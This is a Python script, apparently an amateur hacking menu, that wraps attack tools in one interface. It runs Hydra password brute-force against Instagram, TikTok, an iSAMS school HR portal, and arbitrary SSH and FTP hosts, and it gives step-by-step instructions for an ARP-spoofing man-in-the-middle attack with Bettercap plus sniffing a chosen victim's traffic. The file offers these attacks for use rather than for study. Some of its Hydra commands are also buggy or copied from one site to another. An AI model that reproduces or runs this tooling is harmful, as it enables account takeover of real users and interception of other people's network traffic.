import os
from colorama import Fore
import time

def main():
    while True:
        os.system('clear')
        print(Fore.BLUE + '''
    m     m  mmm  m     m         mmm    mmm   mmmmm  mmmmm   mmm   m mm    mmm#
    "m m m" #" "# "m m m"        #"  "  #" "#  # # #  # # #  "   #  #"  #  #" "#
    #m#m#  #   #  #m#m#         #      #   #  # # #  # # #  m"""#  #   #  #   #
    # #   "#m#"   # #          "#mm"  "#m#"  # # #  # # #  "mm"#  #   #  "#m##  - TKERSHAW
    ''')
        print("")
        print("")
        print(Fore.LIGHTMAGENTA_EX + "[0] HYDRA")
        print(Fore.LIGHTMAGENTA_EX + "[00] ARP SPOOF (BETTERCAP MITM ATTACK)")
        print(Fore.LIGHTMAGENTA_EX + "[99] EXIT")
        print("")
        print("")

        choice = input("ENTER CHOICE -> ")

        if choice == "0":
            hydra()
        elif choice == "00":
            ap()
        elif choice == "99":
            break
        else:
            print(Fore.RED + "[-] INVALID CHOICE!")
            time.sleep(2)

def ap():
    os.system('clear')
    print(Fore.BLUE + '''
   mm   mmmmm  mmmmm          mmmm  mmmmm   mmmm   mmmm  mmmmmm
   ##   #   "# #   "#        #"   " #   "# m"  "m m"  "m #
  #  #  #mmmm" #mmm#"        "#mmm  #mmm#" #    # #    # #mmmmm
  #mm#  #   "m #                 "# #      #    # #    # #
 #    # #    " #             "mmm#" #       #mm#   #mm#  #       - BTTERCAP MITM ATTACK
''')
    print("")
    print("")
    print(Fore.LIGHTMAGENTA_EX + '''
[+] INSTRUCTIONS

|WHEN YOU GET INTO THE MENU YOU MUST TYPE THESE COMMANDS|
1. net.probe on
2. net.show
|IT SHOULD POP UP WITH ALL THE LOCAL IPS ON YOUR NETWORK PICK ONE AND KEEP IT IN MIND|
3. set arp.spoof.fullduplex true
4. set arp.spoof.targets [THE IP YOU HAD IN MIND]
|NOW OPEN SOMETHING THAT CAN SNIFF NETWORK TRAFFIC LIKE WIRESHARK, SELECT WLAN0 AND TYPE IN THE TOP|
ip.src == [THE IP YOU HAD IN MIND]
|WHEN FINISHED TYPE|
exit
''')
    print("")
    input("[+] PRESS ENTER TO CONTINUE...")
    os.system('sudo apt install bettercap')
    os.system('sudo bettercap -iface wlan0')
    print("")
    input("[+] PRESS ENTER TO CONTINUE...")

def hydra():
    os.system('clear')
    print(Fore.BLUE + '''
 m    mm     m mmmm   mmmmm    mm
 #    # "m m"  #   "m #   "#   ##
 #mmmm#  "#"   #    # #mmmm"  #  #
 #    #   #    #    # #   "m  #mm#
 #    #   #    #mmm"  #    " #    #
''')
    print("")
    print("")
    print(Fore.LIGHTMAGENTA_EX + "[1] INSTAGRAM")
    print(Fore.LIGHTMAGENTA_EX + "[2} FTP")
    print(Fore.LIGHTMAGENTA_EX + "[3] SSH")
    print(Fore.LIGHTMAGENTA_EX + "[4] TIKTOK")
    print(Fore.LIGHTMAGENTA_EX + "[5] ISAMS")
    print(Fore.LIGHTMAGENTA_EX + "[01] BACK")
    print("")

    choice = input("ENTER CHOICE -> ")

    if choice == "1":
        hydrai()
    elif choice == "2":
        hydraft()
    elif choice == "3":
        hydrash()
    elif choice == "4":
        hydrat()
    elif choice == "5":
        hydrais()
    elif choice == "01":
        main()
    else:
        print(Fore.RED + "[-] INVALID CHOICE!")
        time.sleep(1)

def hydrai():
    os.system('clear')
    print(Fore.BLUE + '''
 m    mm     m mmmm   mmmmm    mm
 #    # "m m"  #   "m #   "#   ##
 #mmmm#  "#"   #    # #mmmm"  #  #
 #    #   #    #    # #   "m  #mm#
 #    #   #    #mmm"  #    " #    # - INSTAGRAM
''')
    print("")
    print("")
    name = input(Fore.LIGHTMAGENTA_EX + "ENTER USERNAME: ")
    wordlist = input(Fore.LIGHTMAGENTA_EX + "ENTER PASSWORD LIST: ")

    if name == name and wordlist == wordlist:
        os.system(f'hydra -l {name} -P {wordlist} -e ns -V -s 443 instagram.com https-post-form "/accounts/login/ajax/:username=^USER^&password=^PASS^:S=authenticated"')
        print("")
        input("[+] PRESS ENTER TO CONTINUE...")

def hydrash():
    os.system('clear')
    print(Fore.BLUE + '''
 m    mm     m mmmm   mmmmm    mm
 #    # "m m"  #   "m #   "#   ##
 #mmmm#  "#"   #    # #mmmm"  #  #
 #    #   #    #    # #   "m  #mm#
 #    #   #    #mmm"  #    " #    # - SSH
''')
    print("")
    print("")
    name = input(Fore.LIGHTMAGENTA_EX + "ENTER USERNAME: ")
    ip = input(Fore.LIGHTMAGENTA_EX + "ENTER IP: ")
    wordlist = input(Fore.LIGHTMAGENTA_EX + "ENTER PASSWORD LIST: ")

    if name == name and wordlist == wordlist:
        os.system(f'hydra -l {name} -p {wordlist} ssh://{ip}')
        print("")
        input("[+] PRESS ENTER TO CONTINUE...")

def hydraft():
    os.system('clear')
    print(Fore.BLUE + '''
 m    mm     m mmmm   mmmmm    mm
 #    # "m m"  #   "m #   "#   ##
 #mmmm#  "#"   #    # #mmmm"  #  #
 #    #   #    #    # #   "m  #mm#
 #    #   #    #mmm"  #    " #    # - FTP
''')
    print("")
    print("")
    name = input(Fore.LIGHTMAGENTA_EX + "ENTER USERNAME: ")
    ip = input(Fore.LIGHTMAGENTA_EX + "ENTER IP: ")
    wordlist = input(Fore.LIGHTMAGENTA_EX + "ENTER PASSWORD LIST: ")

    if name == name and wordlist == wordlist:
        os.system(f'hydra -l {name} -p {wordlist} ftp://{ip}')
        print("")
        input("[+] PRESS ENTER TO CONTINUE...")

def hydrat():
    os.system('clear')
    print(Fore.BLUE + '''
 m    mm     m mmmm   mmmmm    mm
 #    # "m m"  #   "m #   "#   ##
 #mmmm#  "#"   #    # #mmmm"  #  #
 #    #   #    #    # #   "m  #mm#
 #    #   #    #mmm"  #    " #    # - TIKTOK
''')
    print("")
    print("")
    name = input(Fore.LIGHTMAGENTA_EX + "ENTER USERNAME: ")
    wordlist = input(Fore.LIGHTMAGENTA_EX + "ENTER PASSWORD LIST: ")

    if name == name and wordlist == wordlist:
        os.system(f'hydra -l {name} -P {wordlist} -e ns -V -s 443 tiktok.com https-post-form "/accounts/login/ajax/:username=^USER^&password=^PASS^:S=authenticated"')
        print("")
        input("[+] PRESS ENTER TO CONTINUE...")

def hydrais():
    os.system('clear')
    print(Fore.BLUE + '''
 m    mm     m mmmm   mmmmm    mm
 #    # "m m"  #   "m #   "#   ##
 #mmmm#  "#"   #    # #mmmm"  #  #
 #    #   #    #    # #   "m  #mm#
 #    #   #    #mmm"  #    " #    # - ISAMS
''')
    print("")
    print("")
    name = input(Fore.LIGHTMAGENTA_EX + "ENTER USERNAME: ")
    wordlist = input(Fore.LIGHTMAGENTA_EX + "ENTER PASSWORD LIST: ")

    if name == name and wordlist == wordlist:
        os.system(f'hydra -l {name} -P {wordlist} -e ns -V -s 443 "https-post-form://hrpro.isams.cloud/portal/accounts/login/ajax/:username=^USER^&password=^PASS^:S=authenticated"')
        print("")
        input("[+] PRESS ENTER TO CONTINUE...")

if __name__ == "__main__":
    main()
